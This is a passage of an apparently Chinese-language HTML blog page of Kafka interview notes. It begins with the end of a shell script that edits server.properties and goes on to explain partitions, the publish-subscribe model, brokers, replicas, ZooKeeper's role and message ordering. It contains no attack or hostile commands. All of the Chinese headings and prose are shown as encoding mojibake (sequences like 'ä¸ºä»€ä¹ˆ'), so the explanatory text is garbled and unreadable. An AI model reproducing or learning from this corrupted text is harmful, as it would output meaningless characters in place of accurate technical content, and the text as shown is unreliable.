/opt/module/kafka/config/server.properties&#x27;</span><br><span class="line">        done</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h2 id="ä¸ºä»€ä¹ˆé«˜ç‰ˆæœ¬ä¸ç”¨zkï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆé«˜ç‰ˆæœ¬ä¸ç”¨zkï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆé«˜ç‰ˆæœ¬ä¸ç”¨zkï¼Ÿ"></a>ä¸ºä»€ä¹ˆé«˜ç‰ˆæœ¬ä¸ç”¨zkï¼Ÿ</h2><p>ä¸€è¾¹æ‹‰æ¶ˆæ¯ï¼Œä¸€è¾¹è¿˜è¦ä¸zkè¿æ¥ï¼Œæ•ˆç‡ä¸é«˜ã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆè¦è®¾è®¡åˆ†åŒºï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦è®¾è®¡åˆ†åŒºï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦è®¾è®¡åˆ†åŒºï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦è®¾è®¡åˆ†åŒºï¼Ÿ</h2><p>é¦–å…ˆTopicä¸­æœ‰åˆ†åŒºçš„æ¦‚å¿µï¼Œæ¯ä¸ªåˆ†åŒºä¿å­˜å„è‡ªçš„æ•°æ®ï¼Œè€ŒGroupå¯¹åº”ç€Topicï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªTopicä¸­çš„æ•°æ®éƒ½æ˜¯ç”±è¯¥Groupå»æ¶ˆè´¹ï¼Œä¹Ÿå°±æ˜¯å…è®¸å¤šä¸ªæ¶ˆè´¹è€…åŒæ—¶æ¶ˆè´¹ï¼Œè¿™æ ·èƒ½å¤§å¤§æé«˜Kafkaçš„ååé‡ã€‚ä¸è¿‡è¿™æ ·çš„è®¾è®¡ä¹Ÿä¼šå¸¦æ¥ä¸å°‘çš„ä¸ä¾¿ï¼Œæ¯”å¦‚ç‰¹å®šåœºæ™¯ä¸‹ä½ éœ€è¦å»ç»´æŠ¤å¤šä¸ªPartitionä¹‹é—´çš„å…³ç³»ã€‚</p>
<h2 id="Kafka-æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼Ÿ"><a href="#Kafka-æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="Kafka æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼Ÿ"></a>Kafka æ˜¯ä»€ä¹ˆï¼Ÿä¸»è¦åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼Ÿ</h2><p>Kafka æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æµå¼å¤„ç†å¹³å°ã€‚</p>
<p>æµå¹³å°å…·æœ‰ä¸‰ä¸ªå…³é”®åŠŸèƒ½ï¼š</p>
<ol>
<li><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼šå‘å¸ƒå’Œè®¢é˜…æ¶ˆæ¯æµï¼Œè¿™ä¸ªåŠŸèƒ½ç±»ä¼¼äºæ¶ˆæ¯é˜Ÿåˆ—ï¼Œè¿™ä¹Ÿæ˜¯ Kafka ä¹Ÿè¢«å½’ç±»ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„åŸå› ã€‚</li>
<li><strong>å®¹é”™çš„æŒä¹…æ–¹å¼å­˜å‚¨è®°å½•æ¶ˆæ¯æµ</strong>ï¼š Kafka ä¼šæŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œæœ‰æ•ˆé¿å…äº†æ¶ˆæ¯ä¸¢å¤±çš„é£é™©ã€‚</li>
<li><strong>æµå¼å¤„ç†å¹³å°ï¼š</strong> åœ¨æ¶ˆæ¯å‘å¸ƒçš„æ—¶å€™è¿›è¡Œå¤„ç†ï¼ŒKafka æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„æµå¼å¤„ç†ç±»åº“ã€‚</li>
</ol>
<p>Kafka ä¸»è¦æœ‰ä¸¤å¤§åº”ç”¨åœºæ™¯ï¼š</p>
<ol>
<li><strong>æ¶ˆæ¯é˜Ÿåˆ—</strong> ï¼šå»ºç«‹å®æ—¶æµæ•°æ®ç®¡é“ï¼Œä»¥å¯é åœ°åœ¨ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºä¹‹é—´è·å–æ•°æ®ã€‚</li>
<li><strong>æ•°æ®å¤„ç†ï¼š</strong> æ„å»ºå®æ—¶çš„æµæ•°æ®å¤„ç†ç¨‹åºæ¥è½¬æ¢æˆ–å¤„ç†æ•°æ®æµã€‚</li>
</ol>
<h2 id="å’Œå…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ç›¸æ¯”ï¼ŒKafkaçš„ä¼˜åŠ¿åœ¨å“ªé‡Œï¼Ÿ"><a href="#å’Œå…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ç›¸æ¯”ï¼ŒKafkaçš„ä¼˜åŠ¿åœ¨å“ªé‡Œï¼Ÿ" class="headerlink" title="å’Œå…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ç›¸æ¯”ï¼ŒKafkaçš„ä¼˜åŠ¿åœ¨å“ªé‡Œï¼Ÿ"></a>å’Œå…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ç›¸æ¯”ï¼ŒKafkaçš„ä¼˜åŠ¿åœ¨å“ªé‡Œï¼Ÿ</h2><p> Kafka ç›¸æ¯”å…¶ä»–æ¶ˆæ¯é˜Ÿåˆ—ä¸»è¦çš„ä¼˜åŠ¿å¦‚ä¸‹ï¼š</p>
<ol>
<li><strong>æè‡´çš„æ€§èƒ½</strong> ï¼šåŸºäº Scala å’Œ Java è¯­è¨€å¼€å‘ï¼Œè®¾è®¡ä¸­å¤§é‡ä½¿ç”¨äº†æ‰¹é‡å¤„ç†å’Œå¼‚æ­¥çš„æ€æƒ³ï¼Œæœ€é«˜å¯ä»¥æ¯ç§’å¤„ç†åƒä¸‡çº§åˆ«çš„æ¶ˆæ¯ã€‚</li>
<li><strong>ç”Ÿæ€ç³»ç»Ÿå…¼å®¹æ€§æ— å¯åŒ¹æ•Œ</strong> ï¼šKafka ä¸å‘¨è¾¹ç”Ÿæ€ç³»ç»Ÿçš„å…¼å®¹æ€§æ˜¯æœ€å¥½çš„æ²¡æœ‰ä¹‹ä¸€ï¼Œå°¤å…¶åœ¨å¤§æ•°æ®å’Œæµè®¡ç®—é¢†åŸŸã€‚</li>
</ol>
<p>å®é™…ä¸Šåœ¨æ—©æœŸçš„æ—¶å€™ Kafka å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ ¼çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ—©æœŸçš„ Kafka åœ¨æ¶ˆæ¯é˜Ÿåˆ—é¢†åŸŸå°±åƒæ˜¯ä¸€ä¸ªè¡£è¡«è¤´è¤›çš„å­©å­ä¸€æ ·ï¼ŒåŠŸèƒ½ä¸å®Œå¤‡å¹¶ä¸”æœ‰ä¸€äº›å°é—®é¢˜æ¯”å¦‚ä¸¢å¤±æ¶ˆæ¯ã€ä¸ä¿è¯æ¶ˆæ¯å¯é æ€§ç­‰ç­‰ã€‚å½“ç„¶ï¼Œè¿™ä¹Ÿå’Œ LinkedIn æœ€æ—©å¼€å‘ Kafka ç”¨äºå¤„ç†æµ·é‡çš„æ—¥å¿—æœ‰å¾ˆå¤§å…³ç³»ï¼Œäººå®¶æœ¬æ¥æœ€å¼€å§‹å°±ä¸æ˜¯ä¸ºäº†ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—æ»´ï¼Œè°çŸ¥é“åé¢è¯¯æ‰“è¯¯æ’åœ¨æ¶ˆæ¯é˜Ÿåˆ—é¢†åŸŸå æ®äº†ä¸€å¸­ä¹‹åœ°ã€‚</p>
<p>éšç€åç»­çš„å‘å±•ï¼Œè¿™äº›çŸ­æ¿éƒ½è¢« Kafka é€æ­¥ä¿®å¤å®Œå–„ã€‚æ‰€ä»¥ï¼ŒKafka ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—ä¸å¯é è¿™ä¸ªè¯´æ³•å·²ç»è¿‡æ—¶ã€‚</p>
<h2 id="é˜Ÿåˆ—æ¨¡å‹äº†è§£å—ï¼ŸKafka-çš„æ¶ˆæ¯æ¨¡å‹çŸ¥é“å—ï¼Ÿ"><a href="#é˜Ÿåˆ—æ¨¡å‹äº†è§£å—ï¼ŸKafka-çš„æ¶ˆæ¯æ¨¡å‹çŸ¥é“å—ï¼Ÿ" class="headerlink" title="é˜Ÿåˆ—æ¨¡å‹äº†è§£å—ï¼ŸKafka çš„æ¶ˆæ¯æ¨¡å‹çŸ¥é“å—ï¼Ÿ"></a>é˜Ÿåˆ—æ¨¡å‹äº†è§£å—ï¼ŸKafka çš„æ¶ˆæ¯æ¨¡å‹çŸ¥é“å—ï¼Ÿ</h2><h3 id="é˜Ÿåˆ—æ¨¡å‹ï¼šæ—©æœŸçš„æ¶ˆæ¯æ¨¡å‹"><a href="#é˜Ÿåˆ—æ¨¡å‹ï¼šæ—©æœŸçš„æ¶ˆæ¯æ¨¡å‹" class="headerlink" title="é˜Ÿåˆ—æ¨¡å‹ï¼šæ—©æœŸçš„æ¶ˆæ¯æ¨¡å‹"></a>é˜Ÿåˆ—æ¨¡å‹ï¼šæ—©æœŸçš„æ¶ˆæ¯æ¨¡å‹</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058276.png" alt="é˜Ÿåˆ—æ¨¡å‹"></p>
<p><strong>ä½¿ç”¨é˜Ÿåˆ—ï¼ˆQueueï¼‰ä½œä¸ºæ¶ˆæ¯é€šä¿¡è½½ä½“ï¼Œæ»¡è¶³ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…æ¨¡å¼ï¼Œä¸€æ¡æ¶ˆæ¯åªèƒ½è¢«ä¸€ä¸ªæ¶ˆè´¹è€…ä½¿ç”¨ï¼Œæœªè¢«æ¶ˆè´¹çš„æ¶ˆæ¯åœ¨é˜Ÿåˆ—ä¸­ä¿ç•™ç›´åˆ°è¢«æ¶ˆè´¹æˆ–è¶…æ—¶ã€‚</strong> æ¯”å¦‚ï¼šç”Ÿäº§è€…å‘é€ 100 æ¡æ¶ˆæ¯çš„è¯ï¼Œä¸¤ä¸ªæ¶ˆè´¹è€…æ¥æ¶ˆè´¹ä¸€èˆ¬æƒ…å†µä¸‹ä¸¤ä¸ªæ¶ˆè´¹è€…ä¼šæŒ‰ç…§æ¶ˆæ¯å‘é€çš„é¡ºåºå„è‡ªæ¶ˆè´¹ä¸€åŠï¼ˆä¹Ÿå°±æ˜¯ä½ ä¸€ä¸ªæˆ‘ä¸€ä¸ªçš„æ¶ˆè´¹ã€‚ï¼‰</p>
<p><strong>é˜Ÿåˆ—æ¨¡å‹å­˜åœ¨çš„é—®é¢˜ï¼š</strong></p>
<p>å‡å¦‚å­˜åœ¨è¿™æ ·ä¸€ç§æƒ…å†µï¼šéœ€è¦å°†ç”Ÿäº§è€…äº§ç”Ÿçš„æ¶ˆæ¯åˆ†å‘ç»™å¤šä¸ªæ¶ˆè´¹è€…ï¼Œå¹¶ä¸”æ¯ä¸ªæ¶ˆè´¹è€…éƒ½èƒ½æ¥æ”¶åˆ°å®Œæ•´çš„æ¶ˆæ¯å†…å®¹ã€‚</p>
<p>è¿™ç§æƒ…å†µï¼Œé˜Ÿåˆ—æ¨¡å‹å°±ä¸å¥½è§£å†³äº†ã€‚å¾ˆå¤šæ¯”è¾ƒæ ç²¾çš„äººå°±è¯´ï¼šæˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªæ¶ˆè´¹è€…åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„é˜Ÿåˆ—ï¼Œè®©ç”Ÿäº§è€…å‘é€å¤šä»½ã€‚è¿™æ˜¯ä¸€ç§éå¸¸æ„šè ¢çš„åšæ³•ï¼Œæµªè´¹èµ„æºä¸è¯´ï¼Œè¿˜è¿èƒŒäº†ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„ç›®çš„ã€‚</p>
<h3 id="å‘å¸ƒ-è®¢é˜…æ¨¡å‹ï¼šKafka-æ¶ˆæ¯æ¨¡å‹"><a href="#å‘å¸ƒ-è®¢é˜…æ¨¡å‹ï¼šKafka-æ¶ˆæ¯æ¨¡å‹" class="headerlink" title="å‘å¸ƒ-è®¢é˜…æ¨¡å‹ï¼šKafka æ¶ˆæ¯æ¨¡å‹"></a>å‘å¸ƒ-è®¢é˜…æ¨¡å‹ï¼šKafka æ¶ˆæ¯æ¨¡å‹</h3><p>å‘å¸ƒ-è®¢é˜…æ¨¡å‹ä¸»è¦æ˜¯ä¸ºäº†è§£å†³é˜Ÿåˆ—æ¨¡å‹å­˜åœ¨çš„é—®é¢˜ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058324.png" alt="å‘å¸ƒè®¢é˜…æ¨¡å‹"></p>
<p>å‘å¸ƒè®¢é˜…æ¨¡å‹ï¼ˆPub-Subï¼‰ ä½¿ç”¨<strong>ä¸»é¢˜ï¼ˆTopicï¼‰</strong> ä½œä¸ºæ¶ˆæ¯é€šä¿¡è½½ä½“ï¼Œç±»ä¼¼äº<strong>å¹¿æ’­æ¨¡å¼</strong>ï¼›å‘å¸ƒè€…å‘å¸ƒä¸€æ¡æ¶ˆæ¯ï¼Œè¯¥æ¶ˆæ¯é€šè¿‡ä¸»é¢˜ä¼ é€’ç»™æ‰€æœ‰çš„è®¢é˜…è€…ï¼Œ<strong>åœ¨ä¸€æ¡æ¶ˆæ¯å¹¿æ’­ä¹‹åæ‰è®¢é˜…çš„ç”¨æˆ·åˆ™æ˜¯æ”¶ä¸åˆ°è¯¥æ¡æ¶ˆæ¯çš„</strong>ã€‚</p>
<p><strong>åœ¨å‘å¸ƒ - è®¢é˜…æ¨¡å‹ä¸­ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªè®¢é˜…è€…ï¼Œé‚£å®ƒå’Œé˜Ÿåˆ—æ¨¡å‹å°±åŸºæœ¬æ˜¯ä¸€æ ·çš„äº†ã€‚æ‰€ä»¥è¯´ï¼Œå‘å¸ƒ - è®¢é˜…æ¨¡å‹åœ¨åŠŸèƒ½å±‚é¢ä¸Šæ˜¯å¯ä»¥å…¼å®¹é˜Ÿåˆ—æ¨¡å‹çš„ã€‚</strong></p>
<p><strong>Kafka é‡‡ç”¨çš„å°±æ˜¯å‘å¸ƒ - è®¢é˜…æ¨¡å‹ã€‚</strong></p>
<blockquote>
<p><strong>RocketMQ çš„æ¶ˆæ¯æ¨¡å‹å’Œ Kafka åŸºæœ¬æ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚å”¯ä¸€çš„åŒºåˆ«æ˜¯ Kafka ä¸­æ²¡æœ‰é˜Ÿåˆ—è¿™ä¸ªæ¦‚å¿µï¼Œä¸ä¹‹å¯¹åº”çš„æ˜¯ Partitionï¼ˆåˆ†åŒºï¼‰ã€‚</strong></p>
</blockquote>
<h2 id="ä»€ä¹ˆæ˜¯Producerã€Consumerã€Brokerã€Topicã€Partitionï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Producerã€Consumerã€Brokerã€Topicã€Partitionï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Producerã€Consumerã€Brokerã€Topicã€Partitionï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Producerã€Consumerã€Brokerã€Topicã€Partitionï¼Ÿ</h2><p>Kafka å°†ç”Ÿäº§è€…å‘å¸ƒçš„æ¶ˆæ¯å‘é€åˆ°ä¸»é¢˜ï¼ˆTopicï¼‰ä¸­ï¼Œéœ€è¦è¿™äº›æ¶ˆæ¯çš„æ¶ˆè´¹è€…å¯ä»¥è®¢é˜…è¿™äº›ä¸»é¢˜ï¼ˆTopicï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058422.png" alt="Kafka Topic Partition"></p>
<p>ä¸Šé¢è¿™å¼ å›¾ä¹Ÿä¸ºæˆ‘ä»¬å¼•å‡ºäº†ï¼ŒKafka æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ¦‚å¿µï¼š</p>
<ul>
<li><p><strong>ç”Ÿäº§è€…ï¼ˆProducerï¼‰</strong> ï¼šäº§ç”Ÿæ¶ˆæ¯çš„ä¸€æ–¹ã€‚</p>
</li>
<li><p><strong>æ¶ˆè´¹è€…ï¼ˆConsumerï¼‰</strong> ï¼šæ¶ˆè´¹æ¶ˆæ¯çš„ä¸€æ–¹ã€‚</p>
</li>
<li><p><strong>ä»£ç†ï¼ˆBrokerï¼‰</strong> ï¼šå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ Kafka å®ä¾‹ã€‚å¤šä¸ª Kafka Broker ç»„æˆä¸€ä¸ª Kafka Clusterã€‚åŒæ—¶ï¼Œæ¯ä¸ª Broker ä¸­åˆåŒ…å«äº† Topic ä»¥åŠ Partition è¿™ä¸¤ä¸ªé‡è¦çš„æ¦‚å¿µï¼š</p>
</li>
</ul>
<ul>
<li><strong>ä¸»é¢˜ï¼ˆTopicï¼‰</strong> ï¼šProducer å°†æ¶ˆæ¯å‘é€åˆ°ç‰¹å®šçš„ä¸»é¢˜ï¼ŒConsumer é€šè¿‡è®¢é˜…ç‰¹å®šçš„ä¸»é¢˜ï¼ˆTopicï¼‰ æ¥æ¶ˆè´¹æ¶ˆæ¯ã€‚</li>
<li><strong>åˆ†åŒºï¼ˆPartitionï¼‰</strong> ï¼šPartition å±äº Topic çš„ä¸€éƒ¨åˆ†ã€‚ä¸€ä¸ª Topic å¯ä»¥æœ‰å¤šä¸ª Partition ï¼Œå¹¶ä¸”åŒä¸€ Topic ä¸‹çš„ Partition å¯ä»¥åˆ†å¸ƒåœ¨ä¸åŒçš„ Broker ä¸Šï¼Œè¿™ä¹Ÿå°±è¡¨æ˜ä¸€ä¸ª Topic å¯ä»¥æ¨ªè·¨å¤šä¸ª Broker ã€‚</li>
</ul>
<blockquote>
<p>é‡ç‚¹ï¼šKafka ä¸­çš„ Partitionï¼ˆåˆ†åŒºï¼‰ å®é™…ä¸Šå¯ä»¥å¯¹åº”æˆæ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„é˜Ÿåˆ—ã€‚</p>
</blockquote>
<h2 id="Kafka-çš„å¤šå‰¯æœ¬æœºåˆ¶äº†è§£å—ï¼Ÿå¸¦æ¥äº†ä»€ä¹ˆå¥½å¤„ï¼Ÿ"><a href="#Kafka-çš„å¤šå‰¯æœ¬æœºåˆ¶äº†è§£å—ï¼Ÿå¸¦æ¥äº†ä»€ä¹ˆå¥½å¤„ï¼Ÿ" class="headerlink" title="Kafka çš„å¤šå‰¯æœ¬æœºåˆ¶äº†è§£å—ï¼Ÿå¸¦æ¥äº†ä»€ä¹ˆå¥½å¤„ï¼Ÿ"></a>Kafka çš„å¤šå‰¯æœ¬æœºåˆ¶äº†è§£å—ï¼Ÿå¸¦æ¥äº†ä»€ä¹ˆå¥½å¤„ï¼Ÿ</h2><p>åˆ†åŒºï¼ˆPartitionï¼‰ä¸­çš„å¤šä¸ªå‰¯æœ¬ä¹‹é—´ä¼šæœ‰ä¸€ä¸ªå«åš leader çš„å®¶ä¼™ï¼Œå…¶ä»–å‰¯æœ¬ç§°ä¸º followerã€‚å‘é€çš„æ¶ˆæ¯ä¼šè¢«å‘é€åˆ° leader å‰¯æœ¬ï¼Œç„¶å follower å‰¯æœ¬æ‰èƒ½ä» leader å‰¯æœ¬ä¸­æ‹‰å–æ¶ˆæ¯è¿›è¡ŒåŒæ­¥ã€‚</p>
<blockquote>
<p>ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…åªä¸ leader å‰¯æœ¬äº¤äº’ã€‚å¯ä»¥ç†è§£ä¸ºå…¶ä»–å‰¯æœ¬åªæ˜¯ leader å‰¯æœ¬çš„æ‹·è´ï¼Œå®ƒä»¬çš„å­˜åœ¨åªæ˜¯ä¸ºäº†ä¿è¯æ¶ˆæ¯å­˜å‚¨çš„å®‰å…¨æ€§ã€‚å½“ leader å‰¯æœ¬å‘ç”Ÿæ•…éšœæ—¶ä¼šä» follower ä¸­é€‰ä¸¾å‡ºä¸€ä¸ª leaderï¼Œä½†æ˜¯ follower ä¸­å¦‚æœæœ‰å’Œ leader åŒæ­¥ç¨‹åº¦è¾¾ä¸åˆ°è¦æ±‚çš„å‚åŠ ä¸äº† leader çš„ç«é€‰ã€‚</p>
</blockquote>
<p><strong>Kafka çš„å¤šåˆ†åŒºï¼ˆPartitionï¼‰ä»¥åŠå¤šå‰¯æœ¬ï¼ˆReplicaï¼‰æœºåˆ¶æœ‰ä»€ä¹ˆå¥½å¤„å‘¢ï¼Ÿ</strong></p>
<ol>
<li>Kafka é€šè¿‡ç»™ç‰¹å®š Topic æŒ‡å®šå¤šä¸ª Partition, è€Œå„ä¸ª Partition å¯ä»¥åˆ†å¸ƒåœ¨ä¸åŒçš„ Broker ä¸Š, è¿™æ ·ä¾¿èƒ½æä¾›æ¯”è¾ƒå¥½çš„å¹¶å‘èƒ½åŠ›ï¼ˆè´Ÿè½½å‡è¡¡ï¼‰ã€‚</li>
<li>Partition å¯ä»¥æŒ‡å®šå¯¹åº”çš„ Replica æ•°, è¿™ä¹Ÿæå¤§åœ°æé«˜äº†æ¶ˆæ¯å­˜å‚¨çš„å®‰å…¨æ€§, æé«˜äº†å®¹ç¾èƒ½åŠ›ï¼Œä¸è¿‡ä¹Ÿç›¸åº”çš„å¢åŠ äº†æ‰€éœ€è¦çš„å­˜å‚¨ç©ºé—´ã€‚</li>
</ol>
<h2 id="Zookeeper-åœ¨-Kafka-ä¸­çš„ä½œç”¨çŸ¥é“å—ï¼Ÿ"><a href="#Zookeeper-åœ¨-Kafka-ä¸­çš„ä½œç”¨çŸ¥é“å—ï¼Ÿ" class="headerlink" title="Zookeeper åœ¨ Kafka ä¸­çš„ä½œç”¨çŸ¥é“å—ï¼Ÿ"></a>Zookeeper åœ¨ Kafka ä¸­çš„ä½œç”¨çŸ¥é“å—ï¼Ÿ</h2><blockquote>
<p><strong>è¦æƒ³ææ‡‚ zookeeper åœ¨ Kafka ä¸­çš„ä½œç”¨ ä¸€å®šè¦è‡ªå·±æ­å»ºä¸€ä¸ª Kafka ç¯å¢ƒç„¶åè‡ªå·±è¿› zookeeper å»çœ‹ä¸€ä¸‹æœ‰å“ªäº›æ–‡ä»¶å¤¹å’Œ Kafka æœ‰å…³ï¼Œæ¯ä¸ªèŠ‚ç‚¹åˆä¿å­˜äº†ä»€ä¹ˆä¿¡æ¯ã€‚</strong></p>
</blockquote>
<p>ä¸‹å›¾å°±æ˜¯æˆ‘çš„æœ¬åœ° Zookeeper ï¼Œå®ƒæˆåŠŸå’Œæˆ‘æœ¬åœ°çš„ Kafka å…³è”ä¸Šï¼ˆä»¥ä¸‹æ–‡ä»¶å¤¹ç»“æ„å€ŸåŠ© idea æ’ä»¶ Zookeeper tool å®ç°ï¼‰ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058477.jpg" alt="img"></p>
<p>ZooKeeper ä¸»è¦ä¸º Kafka æä¾›å…ƒæ•°æ®çš„ç®¡ç†çš„åŠŸèƒ½ã€‚</p>
<p>ä»å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼ŒZookeeper ä¸»è¦ä¸º Kafka åšäº†ä¸‹é¢è¿™äº›äº‹æƒ…ï¼š</p>
<ol>
<li><strong>Broker æ³¨å†Œ</strong> ï¼šåœ¨ Zookeeper ä¸Šä¼šæœ‰ä¸€ä¸ªä¸“é—¨<strong>ç”¨æ¥è¿›è¡Œ Broker æœåŠ¡å™¨åˆ—è¡¨è®°å½•</strong>çš„èŠ‚ç‚¹ã€‚æ¯ä¸ª Broker åœ¨å¯åŠ¨æ—¶ï¼Œéƒ½ä¼šåˆ° Zookeeper ä¸Šè¿›è¡Œæ³¨å†Œï¼Œå³åˆ° <code>/brokers/ids</code> ä¸‹åˆ›å»ºå±äºè‡ªå·±çš„èŠ‚ç‚¹ã€‚æ¯ä¸ª Broker å°±ä¼šå°†è‡ªå·±çš„ IP åœ°å€å’Œç«¯å£ç­‰ä¿¡æ¯è®°å½•åˆ°è¯¥èŠ‚ç‚¹ä¸­å»</li>
<li><strong>Topic æ³¨å†Œ</strong> ï¼š åœ¨ Kafka ä¸­ï¼ŒåŒä¸€ä¸ª<strong>Topic çš„æ¶ˆæ¯ä¼šè¢«åˆ†æˆå¤šä¸ªåˆ†åŒº</strong>å¹¶å°†å…¶åˆ†å¸ƒåœ¨å¤šä¸ª Broker ä¸Šï¼Œ<strong>è¿™äº›åˆ†åŒºä¿¡æ¯åŠä¸ Broker çš„å¯¹åº”å…³ç³»</strong>ä¹Ÿéƒ½æ˜¯ç”± Zookeeper åœ¨ç»´æŠ¤ã€‚æ¯”å¦‚æˆ‘åˆ›å»ºäº†ä¸€ä¸ªåå­—ä¸º my-topic çš„ä¸»é¢˜å¹¶ä¸”å®ƒæœ‰ä¸¤ä¸ªåˆ†åŒºï¼Œå¯¹åº”åˆ° zookeeper ä¸­ä¼šåˆ›å»ºè¿™äº›æ–‡ä»¶å¤¹ï¼š<code>/brokers/topics/my-topic/Partitions/0</code>ã€<code>/brokers/topics/my-topic/Partitions/1</code></li>
<li><strong>è´Ÿè½½å‡è¡¡</strong> ï¼šKafka é€šè¿‡ç»™ç‰¹å®š Topic æŒ‡å®šå¤šä¸ª Partitionï¼Œè€Œå„ä¸ª Partition å¯ä»¥åˆ†å¸ƒåœ¨ä¸åŒçš„ Broker ä¸Šï¼Œè¿™æ ·ä¾¿èƒ½æä¾›æ¯”è¾ƒå¥½çš„å¹¶å‘èƒ½åŠ›ã€‚ å¯¹äºåŒä¸€ä¸ª Topic çš„ä¸åŒ Partitionï¼ŒKafka ä¼šå°½åŠ›å°†è¿™äº› Partition åˆ†å¸ƒåˆ°ä¸åŒçš„ Broker æœåŠ¡å™¨ä¸Šã€‚å½“ç”Ÿäº§è€…äº§ç”Ÿæ¶ˆæ¯åä¹Ÿä¼šå°½é‡æŠ•é€’åˆ°ä¸åŒ Broker çš„ Partition é‡Œé¢ã€‚å½“ Consumer æ¶ˆè´¹çš„æ—¶å€™ï¼ŒZookeeper å¯ä»¥æ ¹æ®å½“å‰çš„ Partition æ•°é‡ä»¥åŠ Consumer æ•°é‡æ¥å®ç°åŠ¨æ€è´Ÿè½½å‡è¡¡ã€‚</li>
<li>â€¦â€¦</li>
</ol>
<h2 id="Kafka-å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„æ¶ˆè´¹é¡ºåºï¼Ÿ"><a href="#Kafka-å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„æ¶ˆè´¹é¡ºåºï¼Ÿ" class="headerlink" title="Kafka å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„æ¶ˆè´¹é¡ºåºï¼Ÿ"></a>Kafka å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„æ¶ˆè´¹é¡ºåºï¼Ÿ</h2><p>åœ¨ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„è¿‡ç¨‹ä¸­ç»å¸¸æœ‰ä¸šåŠ¡åœºæ™¯éœ€è¦ä¸¥æ ¼ä¿è¯æ¶ˆæ¯çš„æ¶ˆè´¹é¡ºåºï¼Œæ¯”å¦‚åŒæ—¶å‘äº† 2 ä¸ªæ¶ˆæ¯ï¼Œè¿™ 2 ä¸ªæ¶ˆæ¯å¯¹åº”çš„æ“ä½œåˆ†åˆ«å¯¹åº”çš„æ•°æ®åº“æ“ä½œæ˜¯ï¼š</p>
<ol>
<li>æ›´æ”¹ç”¨æˆ·ä¼šå‘˜ç­‰çº§ã€‚</li>
<li>æ ¹æ®ä¼šå‘˜ç­‰çº§è®¡ç®—è®¢å•ä»·æ ¼ã€‚</li>
</ol>
<p>å‡å¦‚è¿™ä¸¤æ¡æ¶ˆæ¯çš„æ¶ˆè´¹é¡ºåºä¸ä¸€æ ·é€ æˆçš„æœ€ç»ˆç»“æœå°±ä¼šæˆªç„¶ä¸åŒã€‚</p>
<p>Kafka ä¸­åˆ†åŒºï¼ˆPartitionï¼‰æ˜¯çœŸæ­£ä¿å­˜æ¶ˆæ¯çš„åœ°æ–¹ï¼Œå‘é€çš„æ¶ˆæ¯éƒ½è¢«æ”¾åœ¨äº†è¿™é‡Œã€‚è€Œåˆ†åŒºï¼ˆPartitionï¼‰åˆå­˜åœ¨äº ä¸»é¢˜ï¼ˆTopicï¼‰ è¿™ä¸ªæ¦‚å¿µä¸­ï¼Œå¹¶ä¸”å¯ä»¥ç»™ç‰¹å®š Topic æŒ‡å®šå¤šä¸ª Partitionã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058526.png" alt="img"></p>
